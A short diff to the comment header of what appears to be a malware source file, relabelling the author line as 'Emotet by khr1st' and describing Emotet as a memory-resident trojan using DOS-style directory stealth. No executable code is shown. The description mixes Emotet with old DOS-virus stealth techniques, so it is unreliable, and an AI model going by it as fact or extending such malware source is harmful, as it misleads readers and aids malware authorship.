@@ -1,5 +1,5 @@
 ; =======================================================================>
-;  khr1st - 2023
+;  Emotet by khr1st - 2023
 ;
 ;  Emotet is a memory-resident trojan malware that primarily spreads through spam emails. 
 ;  It hides itself using directory stealth techniques (11/12 and 4E/4F) to avoid detection by
